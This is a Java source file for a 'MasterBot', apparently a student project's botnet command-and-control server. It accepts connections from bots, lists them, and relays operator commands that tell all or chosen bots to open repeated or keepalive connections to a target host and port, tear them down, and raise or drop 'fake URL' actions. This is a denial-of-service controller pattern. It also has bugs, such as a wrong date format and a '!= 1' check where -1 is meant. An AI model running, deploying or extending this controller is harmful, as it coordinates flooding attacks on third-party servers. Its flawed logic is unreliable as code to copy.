
/********Master Bot********/
//package javaproj;


/********Master Bot********/

import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;

/**
* @author preethi
*/
public class MasterBot implements Runnable {
	private static ServerSocket server;
	private static Socket serverSocket;
	static int serverPort;
	private static ArrayList<Socket> clientSockets = new ArrayList<Socket>();
	private static ArrayList<String> clientRegisteredDate = new ArrayList<String>();

	public void run() {

		/*Creating, initiating and Starting the server*/
		try {
			server = new ServerSocket(serverPort);
			while (true) {
				//System.out.println(serverPort);
				serverSocket = server.accept();
				clientSockets.add(serverSocket);
				Date todaysDate = new Date();
				String regDate = new SimpleDateFormat("yyyy-mm-dd").format(todaysDate);
				clientRegisteredDate.add(regDate);
			}
		} catch (Exception exceptionStack) {
			System.out.println(exceptionStack);
		}
	}

	public static void main(String[] params){
		if (params[0].equals("-p") && params[1] != null) {
			serverPort = Integer.parseInt(params[1]);
			/*Creating server for listening*/
			MasterBot serverBot = new MasterBot();
			new Thread(serverBot).start();
			Scanner keyScanner = new Scanner(System.in);
			while (true) {
				System.out.print(">");
				String command = keyScanner.nextLine();
				if (command.contains("list")) {
					try {
						if (clientSockets.size() > 0) {
							for (int connections = 0; connections <= clientSockets.size() - 1; connections++) {
								/*
								 * Display - Client name * Client ip adress *
								 * Client port * Client registration date
								 */
								System.out.format("%10s \t %10s \t %8d \t %10s \n",
										((clientSockets.get(connections).getInetAddress()).getHostName()),
										clientSockets.get(connections).getInetAddress().getHostAddress().toString(),
										clientSockets.get(connections).getPort(),
										clientRegisteredDate.get(connections));
							}
						}
					} catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}
				} 
				if (command.contains("connect") && !(command.contains("dis"))) {
					int numberOfConnections = -1;
					String[] commandParams = command.split("\\s+");
					try {
						if (commandParams[1].equals("all")) {
							int connections = 0;
							while(connections < clientSockets.size()) {
								PrintStream printService = new PrintStream(
										(clientSockets.get(connections)).getOutputStream());
                              switch(commandParams.length) {
                              case 5:
									if(commandParams[4].equals("keepalive")|| command.contains("url")){
										printService.println(commandParams[0]+" "+commandParams[2]+" "
										     +commandParams[3]+" "+ "1" +" "+commandParams[4]);	
									}else {
										printService.println(commandParams[0]+" "+commandParams[2]+" "
										    +commandParams[3]+" "+commandParams[4]);
									}
								break;
                              case 6:
									if(commandParams[5].equals("keepalive") || command.contains("url")){
										printService.println(commandParams[0]+" "+commandParams[2]+" "
										    +commandParams[3]+" "+ commandParams[4] +" "+commandParams[5]);	
									}break;
                              case 4: 
									/*Establish one connection if not specified for all clients*/
									printService.println(commandParams[0] + " " + commandParams[2] + " "
											+ commandParams[3] + " " + "1");
									break;
									default:
										break;
                              
							}connections++;
							}

						}
						int connections = 0;
						while(connections < clientSockets.size() ) {
							String ipaddr = clientSockets.get(connections).getInetAddress().toString();
							String split = "/";
							int index_ip = ipaddr.indexOf(split);
							if ((commandParams[1].equals(ipaddr.substring(index_ip + 1))) || (commandParams[1].equals(
									clientSockets.get(connections).getInetAddress().getHostName().toString()))) {
								numberOfConnections = connections;
							}connections++;
						}

						if (numberOfConnections != -1) {
							PrintStream printService = new PrintStream(
									clientSockets.get(numberOfConnections).getOutputStream());
							if(commandParams.length == 5){
								if(commandParams[4].equals("keepalive")|| command.contains("url")){
									printService.println(commandParams[0]+" "+commandParams[2]+" "
									     +commandParams[3]+" "+ "1" +" "+commandParams[4]);	
								}else{
									printService.println(commandParams[0]+" "+commandParams[2]+" "
								         +commandParams[3]+" "+commandParams[4]);
								}
							}
							else if(commandParams.length == 6 && (commandParams[5].equals("keepalive")|| command.contains("url"))){
								printService.println(commandParams[0]+" "+commandParams[2]+" "+commandParams[3]
										+" "+commandParams[4]+" "+commandParams[5]);	
							}
							else if (commandParams.length == 4) {
								/*Establish all connections for specified IP*/
								printService.println(
										commandParams[0] + " " + commandParams[2] + " " + commandParams[3] + " " + "1");
							}
						}
					} catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}

				} else if (command.contains("rise-fake-url") &&  !(command.contains("down"))) {
					int numberOfConnections = -1;
					String[] commandParams = command.split("\\s+");
					try {
						if(command.contains("url"))
							for(int connections = 0;connections < clientSockets.size();connections++) {

								PrintStream printService = new PrintStream(
										(clientSockets.get(connections)).getOutputStream());
									if(commandParams[2].equals("80")|| commandParams[2].equals("443")||command.contains("url")){
										
										printService.println(commandParams[0]+" "+commandParams[1]+" "
										     +commandParams[2]+" "+ "1" );	
									}
							}
						int connections = 0;
						while(connections < clientSockets.size() ) {
							String ipaddr = clientSockets.get(connections).getInetAddress().toString();
							String split = "/";
							int index_ip = ipaddr.indexOf(split);
							if ((commandParams[1].equals(ipaddr.substring(index_ip + 1))) || (commandParams[1].equals(
									clientSockets.get(connections).getInetAddress().toString()))) {
								numberOfConnections = connections;
							}connections++;
						}

						if (numberOfConnections != -1) {
							PrintStream printService = new PrintStream(
									clientSockets.get(numberOfConnections).getOutputStream());

							if(commandParams.length == 3){
								if(commandParams[2].equals("80")||commandParams[2].equals("443")|| command.contains("url")){
									
									printService.println(commandParams[0]+" "+commandParams[1]+" "
									     +commandParams[2]+" "+ "1");	
								}
							}
							
						}
					} catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}

				}else if (command.contains("down-fake-url")&&  !(command.contains("rise"))) {
					int numberOfConnections = -1;
					String[] commandParams = command.split("\\s+");
					try {
						if(command.contains("url"))
							for(int connections = 0;connections < clientSockets.size();connections++) {

								PrintStream printService = new PrintStream(
										(clientSockets.get(connections)).getOutputStream());
									if(commandParams[2].equals("80")|| commandParams[2].equals("443")||command.contains("url")){
										
										printService.println(commandParams[0]+" "+commandParams[1]+" "
										     +commandParams[2]+" "+ "1" );	
									}
							}
						int connections = 0;
						while(connections < clientSockets.size() ) {
							String ipaddr = clientSockets.get(connections).getInetAddress().toString();
							String split = "/";
							int index_ip = ipaddr.indexOf(split);
							if ((commandParams[1].equals(ipaddr.substring(index_ip + 1))) || (commandParams[1].equals(
									clientSockets.get(connections).getInetAddress().toString()))) {
								numberOfConnections = connections;
							}connections++;
						}
					} catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}

				}else if (command.contains("disconnect")) {
					int numberOfConnections = -1;
					String[] commandParams = command.split("\\s+");
					try {
						if (commandParams[1].equals("all")) {
							int connections = 0;

							while(connections < clientSockets.size()) {
								PrintStream printService = new PrintStream(
										(clientSockets.get(connections)).getOutputStream());
                              switch(commandParams.length) {
                              case 4: 
									/*Disconnect the mentioned connections for all clients*/
									printService.println(
											commandParams[0] + " " + commandParams[2] + " " + commandParams[3]);
								break;
                              case 3:
									/*Disconnect all connections for all clients*/
									printService.println(commandParams[0] + " " + commandParams[2]);
                                  break;
                              }
								connections++;
							}

						} else {

							for (int connections = 0; connections < clientSockets.size(); connections++) {
								String ipAddress = clientSockets.get(connections).getInetAddress().toString();
								String split = "/";
								int clientIp = ipAddress.indexOf(split);
								if ((commandParams[1].equals(ipAddress.substring(clientIp + 1)))
										|| (commandParams[1].equals(clientSockets.get(connections).getInetAddress()
												.getHostName().toString()))) {
									numberOfConnections = connections;
								}

							}
							if (numberOfConnections != 1) {
								PrintStream printService = new PrintStream(
										(clientSockets.get(numberOfConnections)).getOutputStream());
                              switch(commandParams.length) {
                              case 4: 
									/*Disconnect the mentioned connections for specified IP*/
									printService.println(
											commandParams[0] + " " + commandParams[2] + " " + commandParams[3]);
								break;
                              case 3:
									/*Disconnect all connections for specified IP*/
									printService.println(commandParams[0] + " " + commandParams[2]);
                              break;
								}
                          
							}

						}
					} catch (Exception exceptionStack) {
						System.out.println(exceptionStack);
					}

				}
			}
		}

	}
}
